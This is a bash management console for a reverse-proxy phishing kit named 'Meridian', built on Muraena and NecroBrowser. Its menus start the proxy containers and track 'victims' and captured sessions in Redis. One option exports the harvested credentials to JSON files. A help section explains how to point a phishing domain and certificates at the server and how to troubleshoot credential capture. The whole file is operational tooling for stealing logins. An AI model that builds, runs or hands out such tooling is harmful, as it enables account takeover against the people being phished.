#!/bin/bash
################################################################################
# MERIDIAN INTERACTIVE MANAGEMENT MENU
# Post-deployment configuration and monitoring interface
################################################################################

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
GENERATED_DIR="$CONFIG_DIR/generated"
LOG_DIR="$SCRIPT_DIR/logs"
ENV_FILE="$SCRIPT_DIR/.env"

# Load environment if exists
if [ -f "$ENV_FILE" ]; then
    set -a
    source "$ENV_FILE"
    set +a
fi

################################################################################
# UTILITY FUNCTIONS
################################################################################

print_header() {
    clear
    
    # Reload config for dynamic updates
    if [ -f "$ENV_FILE" ]; then
        source "$ENV_FILE"
    fi
    
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                    🌊 MERIDIAN CONTROL CENTER 🌊                          ║
║                                                                           ║
║              Interactive Management & Monitoring Interface                ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    
    # Display current configuration
    if [ -n "$TARGET_DOMAIN" ] || [ -n "$PHISHING_DOMAIN" ]; then
        echo -e "${BOLD}Configuration:${NC}"
        [ -n "$TARGET_DOMAIN" ] && echo -e "  ${CYAN}Target:${NC}   https://$TARGET_DOMAIN"
        [ -n "$PHISHING_DOMAIN" ] && echo -e "  ${CYAN}Phishing:${NC} https://$PHISHING_DOMAIN"
        echo ""
    fi
}

print_section() {
    echo -e "${BOLD}${BLUE}━━━ $1 ━━━${NC}"
    echo ""
}

print_info() {
    echo -e "${CYAN}ℹ${NC} $1"
}

print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_menu_item() {
    local num="$1"
    local desc="$2"
    echo -e "  ${BOLD}${CYAN}[$num]${NC} $desc"
}

pause() {
    echo ""
    echo -e "${DIM}Press Enter to continue...${NC}"
    read -r
}

confirm() {
    local prompt="$1"
    echo -e "${YELLOW}?${NC} $prompt (y/N): "
    read -r response
    [[ "$response" =~ ^[Yy]$ ]]
}

################################################################################
# SERVICE MANAGEMENT
################################################################################

show_service_status() {
    print_header
    print_section "Service Status"
    
    echo -e "${BOLD}Container Status:${NC}"
    docker-compose ps
    echo ""
    
    echo -e "${BOLD}Health Status:${NC}"
    for service in redis muraena necrobrowser web-panel; do
        local health=$(docker inspect --format='{{.State.Health.Status}}' meridian-$service 2>/dev/null || echo "no healthcheck")
        local status=$(docker inspect --format='{{.State.Status}}' meridian-$service 2>/dev/null || echo "not found")
        
        if [ "$status" = "running" ]; then
            if [ "$health" = "healthy" ]; then
                print_success "$service: Running (Healthy)"
            elif [ "$health" = "no healthcheck" ]; then
                print_info "$service: Running (No healthcheck)"
            else
                print_warning "$service: Running ($health)"
            fi
        else
            print_error "$service: $status"
        fi
    done
    
    echo ""
    echo -e "${BOLD}Resource Usage:${NC}"
    docker stats --no-stream --format "table {{.Container}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}" \
        meridian-redis meridian-muraena meridian-necrobrowser meridian-panel 2>/dev/null || \
        print_warning "Unable to fetch resource stats"
    
    pause
}

start_services() {
    print_header
    print_section "Starting Services"
    
    if confirm "Start all Meridian services?"; then
        print_info "Starting services..."
        docker-compose up -d
        
        print_info "Waiting for services to be healthy..."
        sleep 10
        
        print_success "Services started"
        show_service_status
    fi
}

stop_services() {
    print_header
    print_section "Stopping Services"
    
    if confirm "Stop all Meridian services?"; then
        print_info "Stopping services..."
        docker-compose down
        print_success "Services stopped"
    fi
    pause
}

restart_services() {
    print_header
    print_section "Restarting Services"
    
    echo "Select service to restart:"
    print_menu_item "1" "All services"
    print_menu_item "2" "Muraena only"
    print_menu_item "3" "NecroBrowser only"
    print_menu_item "4" "Redis only"
    print_menu_item "0" "Cancel"
    echo ""
    
    read -p "Choice: " choice
    
    case $choice in
        1)
            print_info "Restarting all services..."
            docker-compose restart
            print_success "All services restarted"
            ;;
        2)
            print_info "Restarting Muraena..."
            docker-compose restart muraena
            print_success "Muraena restarted"
            ;;
        3)
            print_info "Restarting NecroBrowser..."
            docker-compose restart necrobrowser
            print_success "NecroBrowser restarted"
            ;;
        4)
            print_info "Restarting Redis..."
            docker-compose restart redis
            print_success "Redis restarted"
            ;;
        0)
            return
            ;;
    esac
    
    pause
}

view_logs() {
    print_header
    print_section "Service Logs"
    
    echo "Select service:"
    print_menu_item "1" "Muraena"
    print_menu_item "2" "NecroBrowser"
    print_menu_item "3" "Redis"
    print_menu_item "4" "Web Panel"
    print_menu_item "5" "All services (live tail)"
    print_menu_item "0" "Back"
    echo ""
    
    read -p "Choice: " choice
    
    show_log_exit_hint() {
        echo -e "\n${YELLOW}Press Ctrl+C to exit logs and return to menu${NC}\n"
        sleep 1
    }
    
    case $choice in
        1) show_log_exit_hint; docker-compose logs --tail=100 -f muraena ;;
        2) show_log_exit_hint; docker-compose logs --tail=100 -f necrobrowser ;;
        3) show_log_exit_hint; docker-compose logs --tail=100 -f redis ;;
        4) show_log_exit_hint; docker-compose logs --tail=100 -f web-panel ;;
        5) show_log_exit_hint; docker-compose logs --tail=50 -f ;;
        0) return ;;
    esac
}

################################################################################
# MONITORING & STATISTICS
################################################################################

show_campaign_stats() {
    print_header
    print_section "Campaign Statistics"
    
    if [ -f "$ENV_FILE" ]; then
        echo -e "${BOLD}Campaign Information:${NC}"
        echo "  Name:           ${CAMPAIGN_NAME:-N/A}"
        echo "  Target Domain:  ${TARGET_DOMAIN:-N/A}"
        echo "  Phishing Domain: ${PHISHING_DOMAIN:-N/A}"
        echo "  Deploy Date:    ${DEPLOY_DATE:-N/A}"
        echo ""
    fi
    
    echo -e "${BOLD}Redis Statistics:${NC}"
    if docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" INFO stats 2>/dev/null | grep -E "total_connections_received|total_commands_processed|keyspace_hits|keyspace_misses"; then
        :
    else
        print_warning "Unable to fetch Redis stats"
    fi
    echo ""
    
    echo -e "${BOLD}Captured Sessions:${NC}"
    local session_count=$(docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" KEYS "session:*" 2>/dev/null | wc -l || echo "0")
    echo "  Total Sessions: $session_count"
    echo ""
    
    echo -e "${BOLD}Victim Tracking:${NC}"
    local victim_count=$(docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" KEYS "victim:*" 2>/dev/null | wc -l || echo "0")
    echo "  Total Victims: $victim_count"
    echo ""
    
    pause
}

show_live_monitoring() {
    print_header
    print_section "Live Monitoring"
    
    print_info "Starting live monitoring (Ctrl+C to exit)..."
    echo ""
    
    while true; do
        clear
        print_header
        echo -e "${BOLD}Live Monitoring - $(date '+%Y-%m-%d %H:%M:%S')${NC}"
        echo ""
        
        # Service status
        echo -e "${BOLD}Services:${NC}"
        for service in redis muraena necrobrowser; do
            local status=$(docker inspect --format='{{.State.Status}}' meridian-$service 2>/dev/null || echo "down")
            if [ "$status" = "running" ]; then
                echo -e "  ${GREEN}●${NC} $service"
            else
                echo -e "  ${RED}●${NC} $service"
            fi
        done
        echo ""
        
        # Resource usage
        echo -e "${BOLD}Resources:${NC}"
        docker stats --no-stream --format "  {{.Container}}: CPU {{.CPUPerc}} | MEM {{.MemPerc}}" \
            meridian-redis meridian-muraena meridian-necrobrowser 2>/dev/null
        echo ""
        
        # Recent activity
        echo -e "${BOLD}Recent Activity:${NC}"
        docker-compose logs --tail=5 --no-log-prefix 2>/dev/null | tail -5
        
        sleep 5
    done
}

export_credentials() {
    print_header
    print_section "Export Credentials"
    
    local export_dir="$SCRIPT_DIR/exports"
    mkdir -p "$export_dir"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local export_file="$export_dir/credentials_${timestamp}.json"
    
    print_info "Exporting credentials from Redis..."
    
    # Export all session data
    docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" --json KEYS "session:*" 2>/dev/null > "$export_file.tmp" || {
        print_error "Failed to export credentials"
        pause
        return
    }
    
    # Format and save
    cat "$export_file.tmp" | jq '.' > "$export_file" 2>/dev/null || mv "$export_file.tmp" "$export_file"
    rm -f "$export_file.tmp"
    
    print_success "Credentials exported to: $export_file"
    
    if [ -s "$export_file" ]; then
        local count=$(cat "$export_file" | jq '. | length' 2>/dev/null || echo "unknown")
        print_info "Total sessions exported: $count"
    fi
    
    pause
}

################################################################################
# CONFIGURATION MANAGEMENT
################################################################################

view_configuration() {
    print_header
    print_section "Current Configuration"
    
    if [ -f "$ENV_FILE" ]; then
        echo -e "${BOLD}Environment Configuration:${NC}"
        cat "$ENV_FILE" | grep -v "^#" | grep -v "^$"
        echo ""
    else
        print_warning "No .env file found"
    fi
    
    if [ -f "$GENERATED_DIR/muraena_config.toml" ]; then
        echo -e "${BOLD}Muraena Configuration:${NC}"
        echo "  Location: $GENERATED_DIR/muraena_config.toml"
        echo ""
    fi
    
    if [ -f "$GENERATED_DIR/necrobrowser_config.json" ]; then
        echo -e "${BOLD}NecroBrowser Configuration:${NC}"
        echo "  Location: $GENERATED_DIR/necrobrowser_config.json"
        echo ""
    fi
    
    pause
}

edit_configuration() {
    print_header
    print_section "Edit Configuration"
    
    echo "Select configuration to edit:"
    print_menu_item "1" "Environment (.env)"
    print_menu_item "2" "Muraena (config.toml)"
    print_menu_item "3" "NecroBrowser (config.json)"
    print_menu_item "0" "Back"
    echo ""
    
    read -p "Choice: " choice
    
    local editor="${EDITOR:-nano}"
    
    case $choice in
        1)
            if [ -f "$ENV_FILE" ]; then
                $editor "$ENV_FILE"
                print_warning "Restart services for changes to take effect"
            else
                print_error ".env file not found"
            fi
            ;;
        2)
            if [ -f "$GENERATED_DIR/muraena_config.toml" ]; then
                $editor "$GENERATED_DIR/muraena_config.toml"
                print_warning "Restart Muraena for changes to take effect"
            else
                print_error "Muraena config not found"
            fi
            ;;
        3)
            if [ -f "$GENERATED_DIR/necrobrowser_config.json" ]; then
                $editor "$GENERATED_DIR/necrobrowser_config.json"
                print_warning "Restart NecroBrowser for changes to take effect"
            else
                print_error "NecroBrowser config not found"
            fi
            ;;
        0)
            return
            ;;
    esac
    
    pause
}

backup_configuration() {
    print_header
    print_section "Backup Configuration"
    
    local backup_dir="$SCRIPT_DIR/backups"
    mkdir -p "$backup_dir"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local backup_file="$backup_dir/meridian_backup_${timestamp}.tar.gz"
    
    print_info "Creating backup..."
    
    tar -czf "$backup_file" \
        -C "$SCRIPT_DIR" \
        .env \
        config/generated \
        docker-compose.yml \
        2>/dev/null || {
        print_error "Backup failed"
        pause
        return
    }
    
    print_success "Backup created: $backup_file"
    pause
}

# Main menu
manage_ssl() {
    print_header
    print_section "SSL Certificate Management"
    
    print_menu_item "1" "View Current SSL Certificate Info"
    print_menu_item "2" "Generate Self-Signed Certificate"
    print_menu_item "3" "Install Let's Encrypt Certificate"
    print_menu_item "4" "Install Custom Certificate"
    print_menu_item "0" "Back to Main Menu"
    
    echo ""
    read -p "Select option: " ssl_choice
    
    case $ssl_choice in
        1)
            print_info "Current SSL Certificate Information:"
            echo ""
            if [ -f "$SCRIPT_DIR/ssl/fullchain.pem" ]; then
                openssl x509 -in "$SCRIPT_DIR/ssl/fullchain.pem" -noout -subject -issuer -dates 2>/dev/null || {
                    print_error "Could not read certificate"
                }
            else
                print_error "No certificate found at $SCRIPT_DIR/ssl/fullchain.pem"
            fi
            pause
            ;;
        2)
            print_info "Generating self-signed certificate..."
            read -p "Enter domain name (e.g., example.com): " domain_name
            
            if [ -z "$domain_name" ]; then
                print_error "Domain name is required"
                pause
                return
            fi
            
            openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
                -keyout "$SCRIPT_DIR/ssl/privkey.pem" \
                -out "$SCRIPT_DIR/ssl/fullchain.pem" \
                -subj "/CN=$domain_name" 2>/dev/null && {
                chmod 600 "$SCRIPT_DIR/ssl"/*.pem
                print_success "Self-signed certificate generated for $domain_name"
            } || {
                print_error "Failed to generate certificate"
            }
            pause
            ;;
        3)
            print_info "Installing Let's Encrypt certificate..."
            
            # Check if certbot is installed
            if ! command -v certbot &> /dev/null; then
                print_warning "Certbot not found. Installing..."
                sudo apt-get update && sudo apt-get install -y certbot || {
                    print_error "Failed to install certbot"
                    pause
                    return
                }
            fi
            
            read -p "Enter domain name: " domain_name
            read -p "Enter email address: " email_address
            
            if [ -z "$domain_name" ] || [ -z "$email_address" ]; then
                print_error "Domain and email are required"
                pause
                return
            fi
            
            print_info "Stopping services temporarily..."
            docker-compose down
            
            sudo certbot certonly --standalone \
                -d "$domain_name" \
                --non-interactive \
                --agree-tos \
                --email "$email_address" \
                --preferred-challenges http && {
                
                sudo cp "/etc/letsencrypt/live/$domain_name/fullchain.pem" "$SCRIPT_DIR/ssl/"
                sudo cp "/etc/letsencrypt/live/$domain_name/privkey.pem" "$SCRIPT_DIR/ssl/"
                sudo chown -R $USER:$USER "$SCRIPT_DIR/ssl"
                chmod 600 "$SCRIPT_DIR/ssl"/*.pem
                
                print_success "Let's Encrypt certificate installed"
                print_info "Restarting services..."
                docker-compose up -d
            } || {
                print_error "Failed to obtain certificate"
                docker-compose up -d
            }
            pause
            ;;
        4)
            print_info "Installing custom certificate..."
            print_info "Place your certificate files in:"
            print_info "  - Certificate: $SCRIPT_DIR/ssl/fullchain.pem"
            print_info "  - Private Key: $SCRIPT_DIR/ssl/privkey.pem"
            echo ""
            read -p "Press Enter when files are in place..."
            
            if [ -f "$SCRIPT_DIR/ssl/fullchain.pem" ] && [ -f "$SCRIPT_DIR/ssl/privkey.pem" ]; then
                chmod 600 "$SCRIPT_DIR/ssl"/*.pem
                print_success "Custom certificates found and permissions set"
                
                if confirm "Restart services to apply changes?"; then
                    docker-compose restart
                    print_success "Services restarted"
                fi
            else
                print_error "Certificate files not found"
            fi
            pause
            ;;
        0)
            return
            ;;
        *)
            print_error "Invalid option"
            pause
            ;;
    esac
    
    # Show menu again after operation
    manage_ssl
}


# Combined SSL and Subdomain Management Menu
manage_ssl_and_subdomains() {
    print_header
    print_section "SSL & Subdomain Management"
    
    print_menu_item "1" "SSL Certificate Management"
    print_menu_item "2" "Subdomain Configuration"
    print_menu_item "0" "Back to Main Menu"
    
    echo ""
    read -p "Select option: " ssl_sub_choice
    
    case $ssl_sub_choice in
        1)
            manage_ssl
            ;;
        2)
            manage_subdomains
            ;;
        0)
            return
            ;;
        *)
            print_error "Invalid option"
            pause
            manage_ssl_and_subdomains
            ;;
    esac
}


# Subdomain Configuration Management
manage_subdomains() {
    print_header
    print_section "Subdomain Configuration Management"
    
    print_menu_item "1" "View Current Subdomains"
    print_menu_item "2" "Add New Subdomain"
    print_menu_item "3" "Remove Subdomain"
    print_menu_item "4" "Test Subdomain Connectivity"
    print_menu_item "0" "Back to Main Menu"
    
    echo ""
    read -p "Select option: " subdomain_choice
    
    case $subdomain_choice in
        1)
            print_section "Current Subdomain Configuration"
            echo ""
            
            if [ -f "$SCRIPT_DIR/.env" ]; then
                print_info "Configured subdomains:"
                echo ""
                grep "^TARGET_SUBDOMAIN" "$SCRIPT_DIR/.env" | while read -r line; do
                    subdomain_num=$(echo "$line" | sed 's/TARGET_SUBDOMAIN_\([0-9]*\)=.*/\1/')
                    subdomain_val=$(echo "$line" | cut -d'=' -f2)
                    if [ -n "$subdomain_val" ]; then
                        echo -e "  ${CYAN}[$subdomain_num]${NC} $subdomain_val"
                    fi
                done
                
                echo ""
                print_info "Primary domains:"
                echo -e "  ${YELLOW}Target:${NC}   $(grep "^TARGET_DOMAIN=" "$SCRIPT_DIR/.env" | cut -d'=' -f2)"
                echo -e "  ${YELLOW}Phishing:${NC} $(grep "^PHISHING_DOMAIN=" "$SCRIPT_DIR/.env" | cut -d'=' -f2)"
            else
                print_error "Configuration file not found at $SCRIPT_DIR/.env"
            fi
            pause
            ;;
            
        2)
            print_section "Add New Subdomain"
            echo ""
            
            # Find next available subdomain number
            next_num=1
            if [ -f "$SCRIPT_DIR/.env" ]; then
                last_num=$(grep "^TARGET_SUBDOMAIN_" "$SCRIPT_DIR/.env" | sed 's/TARGET_SUBDOMAIN_\([0-9]*\)=.*/\1/' | sort -n | tail -1)
                if [ -n "$last_num" ]; then
                    next_num=$((last_num + 1))
                fi
            fi
            
            print_info "Next available subdomain number: $next_num"
            echo ""
            read -p "Enter subdomain (e.g., api.example.com): " new_subdomain
            
            if [ -z "$new_subdomain" ]; then
                print_error "Subdomain cannot be empty"
                pause
                manage_subdomains
                return
            fi
            
            # Validate domain format
            if [[ ! "$new_subdomain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
                print_error "Invalid subdomain format"
                pause
                manage_subdomains
                return
            fi
            
            # Add to .env file
            echo "TARGET_SUBDOMAIN_$next_num=$new_subdomain" >> "$SCRIPT_DIR/.env"
            print_success "Subdomain TARGET_SUBDOMAIN_$next_num=$new_subdomain added"
            echo ""
            print_warning "Note: You may need to restart services for changes to take effect"
            read -p "Restart services now? (y/n): " restart_choice
            if [[ "$restart_choice" =~ ^[Yy]$ ]]; then
                restart_services
            fi
            pause
            ;;
            
        3)
            print_section "Remove Subdomain"
            echo ""
            
            if [ ! -f "$SCRIPT_DIR/.env" ]; then
                print_error "Configuration file not found"
                pause
                manage_subdomains
                return
            fi
            
            print_info "Current subdomains:"
            echo ""
            grep "^TARGET_SUBDOMAIN" "$SCRIPT_DIR/.env" | while read -r line; do
                subdomain_num=$(echo "$line" | sed 's/TARGET_SUBDOMAIN_\([0-9]*\)=.*/\1/')
                subdomain_val=$(echo "$line" | cut -d'=' -f2)
                if [ -n "$subdomain_val" ]; then
                    echo -e "  ${CYAN}[$subdomain_num]${NC} $subdomain_val"
                fi
            done
            
            echo ""
            read -p "Enter subdomain number to remove: " remove_num
            
            if [ -z "$remove_num" ]; then
                print_error "Subdomain number cannot be empty"
                pause
                manage_subdomains
                return
            fi
            
            # Check if subdomain exists
            if grep -q "^TARGET_SUBDOMAIN_$remove_num=" "$SCRIPT_DIR/.env"; then
                removed_value=$(grep "^TARGET_SUBDOMAIN_$remove_num=" "$SCRIPT_DIR/.env" | cut -d'=' -f2)
                sed -i "/^TARGET_SUBDOMAIN_$remove_num=/d" "$SCRIPT_DIR/.env"
                print_success "Removed TARGET_SUBDOMAIN_$remove_num=$removed_value"
                echo ""
                print_warning "Note: You may need to restart services for changes to take effect"
                read -p "Restart services now? (y/n): " restart_choice
                if [[ "$restart_choice" =~ ^[Yy]$ ]]; then
                    restart_services
                fi
            else
                print_error "Subdomain number $remove_num not found"
            fi
            pause
            ;;
            
        4)
            print_section "Test Subdomain Connectivity"
            echo ""
            
            if [ ! -f "$SCRIPT_DIR/.env" ]; then
                print_error "Configuration file not found"
                pause
                manage_subdomains
                return
            fi
            
            print_info "Testing configured subdomains..."
            echo ""
            
            grep "^TARGET_SUBDOMAIN" "$SCRIPT_DIR/.env" | while read -r line; do
                subdomain_num=$(echo "$line" | sed 's/TARGET_SUBDOMAIN_\([0-9]*\)=.*/\1/')
                subdomain_val=$(echo "$line" | cut -d'=' -f2)
                
                if [ -n "$subdomain_val" ]; then
                    echo -e "${CYAN}Testing [$subdomain_num] $subdomain_val${NC}"
                    
                    # Test DNS resolution
                    if host "$subdomain_val" > /dev/null 2>&1; then
                        ip=$(host "$subdomain_val" | grep "has address" | head -1 | awk '{print $4}')
                        echo -e "  ${GREEN}✓${NC} DNS resolves to: $ip"
                        
                        # Test HTTP/HTTPS connectivity
                        if timeout 3 curl -s -o /dev/null -w "%{http_code}" "http://$subdomain_val" > /dev/null 2>&1; then
                            echo -e "  ${GREEN}✓${NC} HTTP connectivity OK"
                        else
                            echo -e "  ${YELLOW}⚠${NC} HTTP connectivity failed"
                        fi
                        
                        if timeout 3 curl -s -o /dev/null -k "https://$subdomain_val" > /dev/null 2>&1; then
                            echo -e "  ${GREEN}✓${NC} HTTPS connectivity OK"
                        else
                            echo -e "  ${YELLOW}⚠${NC} HTTPS connectivity failed"
                        fi
                    else
                        echo -e "  ${RED}✗${NC} DNS resolution failed"
                    fi
                    echo ""
                fi
            done
            
            pause
            ;;
            
        0)
            return
            ;;
            
        *)
            print_error "Invalid option"
            pause
            ;;
    esac
    
    # Show menu again after operation
    manage_subdomains
}

show_main_menu() {
    while true; do
        print_header
        print_section "Meridian Post-Deployment Management"
        
        print_menu_item "1" "Service Status"
        print_menu_item "2" "Start Services"
        print_menu_item "3" "Stop Services"
        print_menu_item "4" "Restart Services"
        print_menu_item "5" "View Logs"
        print_menu_item "6" "Campaign Statistics"
        print_menu_item "7" "Live Monitoring"
        print_menu_item "8" "Export Credentials"
        print_menu_item "9" "View Configuration"
        print_menu_item "10" "Edit Configuration"
        print_menu_item "11" "Backup Configuration"
        print_menu_item "12" "Help & Configuration Guide"
        print_menu_item "13" "SSL & Subdomain Management"
        print_menu_item "0" "Exit"
        
        echo ""
        read -p "Select option: " choice
        
        case $choice in
            1) show_service_status ;;
            2) start_services ;;
            3) stop_services ;;
            4) restart_services ;;
            5) view_logs ;;
            6) show_campaign_stats ;;
            7) show_live_monitoring ;;
            8) export_credentials ;;
            9) view_configuration ;;
            10) edit_configuration ;;
            11) backup_configuration ;;
            12) show_help ;;
            13) manage_ssl_and_subdomains ;;
            0) 
                print_info "Exiting..."
                exit 0
                ;;
            *)
                print_error "Invalid option"
                pause
                ;;
        esac
    done
}

# Run main menu
show_main_menu

show_help() {
    print_header
    print_section "Meridian Configuration Help"
    
    cat << 'HELP'

📚 BASIC CONFIGURATION STEPS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. DOMAIN CONFIGURATION
   ─────────────────────
   • Set your phishing domain in .env file:
     - PHISHING_DOMAIN: Your phishing domain (e.g., example.com)
     - TARGET_DOMAIN: The legitimate site you're proxying (e.g., target.com)
   
   • Update DNS records:
     - Point your phishing domain A record to this server's IP
     - Add wildcard A record (*.example.com) for subdomains

2. SSL CERTIFICATE SETUP
   ──────────────────────
   Option A - Let's Encrypt (Recommended for production):
     • Stop services: docker-compose down
     • Run: sudo certbot certonly --standalone -d yourdomain.com
     • Copy certificates:
       - sudo cp /etc/letsencrypt/live/yourdomain.com/fullchain.pem ./ssl/
       - sudo cp /etc/letsencrypt/live/yourdomain.com/privkey.pem ./ssl/
     • Set permissions: sudo chown -R $USER:$USER ./ssl && chmod 600 ./ssl/*.pem
     • Restart: docker-compose up -d
   
   Option B - Self-Signed (Testing only):
     • Generate: openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
                  -keyout ./ssl/privkey.pem -out ./ssl/fullchain.pem \
                  -subj "/CN=yourdomain.com"
     • Set permissions: chmod 600 ./ssl/*.pem

3. SUBDOMAIN CONFIGURATION
   ────────────────────────
   • Subdomains are configured in config/generated/muraena_config.toml
   • Add to [origins] -> externalOrigins array:
     Example:
       externalOrigins = [
           "www.target.com",
           "api.target.com",
           "cdn.target.com"
       ]
   • Restart muraena after changes: docker-compose restart meridian-muraena

4. SERVICE MANAGEMENT
   ───────────────────
   • Start all services: docker-compose up -d
   • Stop all services: docker-compose down
   • View logs: docker-compose logs -f [service-name]
   • Restart specific service: docker-compose restart [service-name]
   
   Services:
     - meridian-muraena: Main proxy engine
     - meridian-necrobrowser: Browser automation
     - meridian-redis: Session storage
     - meridian-web-panel: Management interface

5. MONITORING & CREDENTIALS
   ─────────────────────────
   • View live logs: Use option 5 from main menu
   • Export captured credentials: Use option 8 from main menu
   • Check campaign stats: Use option 6 from main menu
   • Credentials are stored in Redis and exported to ./exports/

6. CONFIGURATION FILES
   ───────────────────
   Key files:
     • .env - Environment variables and main config
     • config/generated/muraena_config.toml - Muraena proxy config
     • config/generated/necrobrowser_config.json - Browser automation config
     • docker-compose.yml - Service definitions
   
   Edit configs:
     • Use option 10 from main menu
     • Or manually edit and restart: docker-compose restart

7. TROUBLESHOOTING
   ───────────────
   Problem: Services won't start
     ✓ Check logs: docker-compose logs
     ✓ Verify ports 80/443 are free: sudo netstat -tulpn | grep -E ':(80|443)'
     ✓ Check DNS: dig yourdomain.com
   
   Problem: SSL certificate errors
     ✓ Verify certificate files exist: ls -la ./ssl/
     ✓ Check permissions: should be 600
     ✓ Verify certificate matches domain: openssl x509 -in ./ssl/fullchain.pem -noout -subject
   
   Problem: Target site not loading
     ✓ Check TARGET_DOMAIN in .env
     ✓ Verify subdomains are configured correctly
     ✓ Check muraena logs: docker-compose logs meridian-muraena
   
   Problem: Credentials not captured
     ✓ Verify tracking is enabled in muraena_config.toml
     ✓ Check Redis connection: docker-compose logs meridian-redis
     ✓ Review credential patterns in config

8. SECURITY NOTES
   ──────────────
   • Always use HTTPS in production
   • Keep Redis password secure (set in .env)
   • Regularly backup configuration (option 11)
   • Monitor logs for suspicious activity
   • Use firewall rules to restrict access
   • Keep Docker and services updated

9. QUICK REFERENCE COMMANDS
   ────────────────────────
   View service status:     docker-compose ps
   Follow all logs:         docker-compose logs -f
   Restart all:             docker-compose restart
   Check Redis:             docker exec meridian-redis redis-cli ping
   View captured sessions:  docker exec meridian-redis redis-cli KEYS "session:*"
   Export specific creds:   docker exec meridian-redis redis-cli GET "victim:ID"

10. USEFUL PATHS
    ────────────
    Logs:           ./logs/
    SSL Certs:      ./ssl/
    Exports:        ./exports/
    Backups:        ./backups/
    Config:         ./config/generated/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For more detailed information, see:
  • Muraena docs: https://github.com/muraenateam/muraena
  • NecroBrowser docs: https://github.com/muraenateam/necrobrowser

HELP

    echo ""
    pause
}

